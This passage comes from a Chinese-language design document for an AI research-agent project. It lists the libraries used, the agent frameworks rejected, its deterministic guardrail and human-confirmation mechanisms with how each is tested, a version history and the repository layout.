| **rank-bm25** | BM25 关键词检索 | `BM25Okapi(tokenized_corpus)` |
| **PyMuPDF** | PDF 文本提取 | `fitz.open(pdf_path)` |
| **tiktoken** | Token 计数 | `encoding.encode(text)` |
| **networkx** | 知识图谱（V2） | `nx.Graph()` |
| **FastAPI** | HTTP 服务 + SSE | `@app.post("/api/chat")` |
| **React + Vite** | 前端渲染 | dist 静态文件 |

### 12.3 我们明确不使用

**不使用以下 Agent 编排框架**：
- **LangChain AgentExecutor / LangGraph** — 将循环和工具调度封装为黑盒，调试困难；我们 50 行的 `for` 循环更透明
- **AutoGen** — 面向多 Agent 对话场景，引入不必要的抽象层
- **CrewAI** — 角色扮演型多 Agent，过重且不可控
- **Any agent orchestration framework** — 原则：agent loop 必须是确定性的可测试代码

### 12.4 机制性质

| 机制 | 性质 | 测试方式 |
|------|------|----------|
| Guardrail | **代码级（12 regex）** | `test_guardrail_blocks_dangerous()` — 无需 LLM |
| HITL | **代码级（threading.Event + timeout）** | 单元测试 mock confirm event |
| Auto validate | **代码级（subprocess.run）** | 写入临时文件 → 自动验证 → 断言 stderr |
| Param validation | **代码级（字典 key 检查）** | 传入空 params → 断言返回 error |
| Context build | **代码级（字符串拼接 + tiktoken）** | MockLLMProvider → 验证上下文注入内容 |
| Memory | **代码级（文件读写 JSON）** | 写入 → 关闭 → 重启 → 断言 turns 正确加载 |

**核心原则**：每一个机制都是确定性的、可直接用 MockLLMProvider 测试的代码，不是基于 LLM prompt 的"建议"或"期望"。Guardrail 不依赖 LLM 判断危险与否；auto validate 不依赖 LLM 判断代码是否正确；param validation 不依赖 LLM 检查参数完整性。

---

## 附录 A：V1/V2 → V3 演进摘要

| 维度 | V1（LangGraph） | V2（litellm FC） | V3（Harness 定稿） |
|------|-----------------|------------------|---------------------|
| Agent 循环 | LangGraph checkpoint | litellm function calling | litellm FC + 自实现 loop |
| 工具数 | 4 → 11 | 11 | **13**（+delete_paper, +spawn_subagent） |
| 治理 | 无 | guardrail 10+ 模式 | **12-pattern guardrail + HITL + path sandbox + param validation** |
| 反馈 | 无 | validate_result() | **auto_validate (py_compile/pytest/javac) + validate_response + retrieval eval** |
| 前端 | 无 | React + pywebview | React+TS+Vite + SSE 协议 + 工具卡片 + HITL dialog |
| 存储 | SQLite + ChromaDB | + File System JSON | **File System JSON (chat) + SQLite (papers) + ChromaDB (vectors)** |
| 检索降级 | 无 | 无 | **ChromaDB 不可用时优雅降级为 BM25-only** |
| 记忆 | 项目存档 | 对话持久化 | **workspace-scoped + 压缩摘要 (conclusions/dead_ends) + progress.md** |
| 测试 | 部分 | 19 harness tests | **MockLLMProvider + 所有机制可离线测试** |

---

## 附录 B：目录结构

```
research-agent/
├── src/research_agent/
│   ├── agent.py              # Agent 主循环 (run_agent)
│   ├── guardrail.py          # 12-pattern 确定性拦截
│   ├── validate.py           # 响应验证 + 工具输出校验
│   ├── context.py            # Token-aware 上下文构建器
│   ├── memory.py             # 对话持久化接口
│   ├── project_manager.py    # 文件系统项目管理 (JSON)
│   ├── store.py              # SQLite 存储 (papers)
│   ├── vector_store.py       # ChromaDB 封装
│   ├── retrieval.py          # 混合检索 (向量+BM25+RRF k=60)
│   ├── llm.py                # LLM 抽象 (LiteLLMProvider + MockLLMProvider)
│   ├── config.py             # 配置加载 (config.yml + env)
│   ├── server.py             # FastAPI SSE 服务
│   ├── router.py             # 项目路由
│   ├── knowledge_graph.py    # 知识图谱 (networkx, V2)
│   ├── skill_loader.py       # Skill 文件加载
│   ├── tools/
│   │   ├── __init__.py       # ToolRegistry 单例
│   │   ├── schema.py         # ToolSchema + ToolResult
│   │   ├── router.py         # 意图路由 + 反混淆提示
│   │   ├── validate_params.py # 参数校验
│   │   ├── subagent.py       # spawn_subagent 工具
│   │   ├── mcp_loader.py     # MCP Server 自动发现
│   │   ├── git_tool.py       # Git 集成
│   │   └── builtin/
│   │       ├── __init__.py   # register_builtins
│   │       ├── retrieve.py   # 5 个研究工具
│   │       └── filesystem.py # 7 个文件/执行工具
│   └── ...
├── frontend/                 # React + TypeScript + Vite
├── skills/                   # Skill 定义文件 (.md)
├── tests/                    # pytest 测试
│   ├── test_harness_mechanisms.py  # 核心：19 个无 LLM 测试
│   ├── test_guardrail.py
│   ├── test_feedback_loop.py
│   └── ...
├── specs/                    # 设计文档
├── Dockerfile
└── render.yaml
```
